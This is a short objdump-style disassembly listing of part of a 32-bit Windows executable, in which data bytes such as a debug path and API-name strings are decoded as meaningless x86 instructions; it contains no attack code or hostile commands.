  420f5e:	adc    BYTE PTR [eax],al
  420f60:	fld    TBYTE PTR [ecx]
  420f62:	adc    BYTE PTR [eax],al
  420f64:	xchg   edi,eax
  420f65:	sub    al,0x10
  420f67:	add    dh,ah
  420f69:	aaa    
  420f6a:	adc    BYTE PTR [eax],al
  420f6c:	and    eax,0xd5001051
  420f71:	xor    dl,BYTE PTR [eax]
  420f73:	add    BYTE PTR [eax-0x13ffefd8],ch
  420f79:	push   cs
  420f7a:	inc    edx
  420f7b:	add    al,dh
  420f7d:	push   cs
  420f7e:	inc    edx
  420f7f:	add    ah,dh
  420f81:	push   cs
  420f82:	inc    edx
  420f83:	add    al,bh
  420f85:	push   cs
  420f86:	inc    edx
  420f87:	add    ah,bh
  420f89:	push   cs
  420f8a:	inc    edx
  420f8b:	add    BYTE PTR [eax],al
  420f8d:	cmovb  eax,DWORD PTR [eax]
  420f90:	add    al,0xf
  420f92:	inc    edx
  420f93:	add    BYTE PTR [eax],cl
  420f95:	cmovb  eax,DWORD PTR [eax]
  420f98:	adc    DWORD PTR [ebp+0x10],ebx
  420f9b:	add    bh,cl
  420f9d:	push   es
  420f9e:	adc    BYTE PTR [eax],al
  420fa0:	xchg   esp,eax
  420fa1:	xor    eax,0x7b780010
  420fa6:	adc    BYTE PTR [eax],al
  420fa8:	stos   BYTE PTR es:[edi],al
  420fa9:	jo     0x420fbb
  420fab:	add    BYTE PTR [eax],ch
  420fad:	inc    esp
  420fae:	adc    BYTE PTR [eax],al
  420fb0:	pop    ebp
  420fb1:	pop    ecx
  420fb2:	adc    BYTE PTR [eax],al
  420fb4:	fild   QWORD PTR [edi]
  420fb6:	adc    BYTE PTR [eax],al
	...
  420fc0:	push   edx
  420fc1:	push   ebx
  420fc2:	inc    esp
  420fc3:	push   ebx
  420fc4:	adc    esi,DWORD PTR [esi]
  420fc6:	push   edi
  420fc7:	mov    BYTE PTR [esi-0x72bcd9bc],ch
  420fcd:	mov    esi,0x501e2521
  420fd2:	fs jae 0x420fd6
  420fd5:	add    BYTE PTR [eax],al
  420fd7:	add    BYTE PTR [ebx+0x3a],al
  420fda:	pop    esp
  420fdb:	inc    ebx
  420fdc:	jne    0x421050
  420fde:	jb     0x421045
  420fe0:	outs   dx,BYTE PTR ds:[esi]
  420fe1:	je     0x421027
  420fe3:	popa   
  420fe4:	je     0x421047
  420fe6:	pop    esp
  420fe7:	dec    ebp
  420fe8:	outs   dx,DWORD PTR ds:[esi]
  420fe9:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  420ff1:	ins    BYTE PTR es:[edi],dx
  420ff2:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  420ff9:	dec    esi
  420ffa:	gs ja  0x420ffd
  420ffd:	add    BYTE PTR [eax],al
  420fff:	add    BYTE PTR [eax],al
  421001:	add    BYTE PTR [eax],al
  421003:	add    BYTE PTR [edx-0x2c],cl
  421006:	mov    bl,0x4d
  421008:	add    BYTE PTR [eax],al
  42100a:	add    BYTE PTR [eax],al
  42100c:	xor    dl,BYTE PTR [eax]
  42100e:	add    al,BYTE PTR [eax]
  421010:	add    DWORD PTR [eax],eax
  421012:	add    BYTE PTR [eax],al
  421014:	add    DWORD PTR [eax],eax
  421016:	add    BYTE PTR [eax],al
  421018:	add    DWORD PTR [eax],eax
  42101a:	add    BYTE PTR [eax],al
  42101c:	sub    BYTE PTR [eax],dl
  42101e:	add    al,BYTE PTR [eax]
  421020:	sub    al,0x10
  421022:	add    al,BYTE PTR [eax]
  421024:	xor    BYTE PTR [eax],dl
  421026:	add    al,BYTE PTR [eax]
  421028:	mov    edi,0x3e000020
  42102d:	adc    BYTE PTR [edx],al
  42102f:	add    BYTE PTR [eax],al
  421031:	add    BYTE PTR [ebx+0x79],dl
  421034:	ins    DWORD PTR es:[edi],dx
  421035:	bound  ebp,QWORD PTR [edi+0x6c]
  421038:	imul   esp,DWORD PTR [ebx+0x45],0x3f006578
  42103f:	inc    ebx
  421040:	ins    BYTE PTR es:[edi],dx
  421041:	outs   dx,DWORD PTR ds:[esi]
  421042:	jae    0x4210a9
  421044:	push   edi
  421045:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  42104c:	popa   
  42104d:	je     0x4210b8
  42104f:	outs   dx,DWORD PTR ds:[esi]
  421050:	outs   dx,BYTE PTR ds:[esi]
  421051:	inc    ebx
  421052:	ins    BYTE PTR es:[edi],dx
  421053:	outs   dx,DWORD PTR ds:[esi]
  421054:	jae    0x4210bb
  421056:	push   edi
  421057:	.byte 0x69
